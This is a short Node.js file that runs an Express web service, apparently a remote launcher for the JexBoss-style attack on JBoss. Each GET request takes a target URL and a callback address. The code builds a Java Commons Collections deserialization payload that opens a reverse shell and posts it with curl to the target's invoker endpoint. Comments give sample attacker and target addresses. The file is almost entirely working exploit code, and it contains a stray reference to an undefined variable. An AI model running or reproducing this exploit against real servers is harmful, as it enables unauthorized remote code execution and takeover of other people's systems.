


const { spawn } = require('child_process');
var os = require('os');
var ip = require('ip');
var path = require('path')

function hack(url,reverse) {
    console.log('url: ',url);
    console.log('reverse: ',reverse)
    //java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 45.32.82.186:1234
    const h2hc = spawn('java', [
        '-cp',
        '.:commons-collections-3.2.1.jar',
        'ReverseShellCommonsCollectionsHashMap'
        , reverse],{
            cwd:path.join(__dirname,'egg')
        });

    h2hc.stdout.on('data', (data) => {
        console.log(`h2hc stdout: ${data}`);
        if (data.indexOf('Type [ENTER] to continue...') > -1) {
            nc.stdin.write('\n');
        }
    });

    h2hc.stderr.on('data', (data) => {
        console.log(`h2hc stderr: ${data}`);
    });

    h2hc.on('close', (code) => {
        console.log(`h2hc child process exited with code ${code}`);

        //curl 127.0.0.1:8000 --data-binary @ObjectFile.ser
        const curl = spawn('curl', [
            url,
            '--data-binary',
            '@ReverseShellCommonsCollectionsHashMap.ser'
            , reverse],{
                cwd:path.join(__dirname,'egg')
            });
    });

}
//hack('http://jboss:8080/invoker/readonly','172.18.0.4:10001') 
//hack('http://jboss:8080/invoker/readonly','172.18.0.4:10001')
var express = require('express');
var app = express();

app.get('/', function (req, res) {
  hack(req.query.url,req.query.reverse)
  res.send('ok');
});

var server = app.listen(3000, function () {
  var host =ip.address();
  var port = server.address().port;

  console.log('jexboss server app listening at http://%s:%s', host, port);
});